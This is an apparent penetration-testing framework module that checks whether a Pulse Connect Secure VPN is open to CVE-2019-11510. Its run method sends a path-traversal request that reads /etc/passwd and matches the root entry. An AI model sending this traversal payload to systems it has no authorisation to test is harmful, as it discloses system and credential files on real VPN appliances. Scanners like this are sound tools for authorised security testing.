#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pulse Secure Pulse Connect Secure (PCS) 8."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pulse Connect Secure SSL VPN Arbitrary File Read Detection',
        'description': 'Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 all contain an arbitrary file reading vulnerability that could allow unauthenticated remote attackers to send a specially crafted URI to gain improper access.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'packetstorm', 'cve2019', 'pulsesecure', 'lfi', 'kev', 'ivanti', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html',
            'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-11510',
            'http://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html',
            'http://packetstormsecurity.com/files/154231/Pulse-Secure-SSL-VPN-File-Disclosure-NSE.html',
        ],
        'cve': 'CVE-2019-11510',
    }

    def run(self):
        r = self.http_request(method="GET", path='/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Pulse Connect Secure SSL VPN Arbitrary File Read detected",
                path='/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/',
            )
            return True
        return False

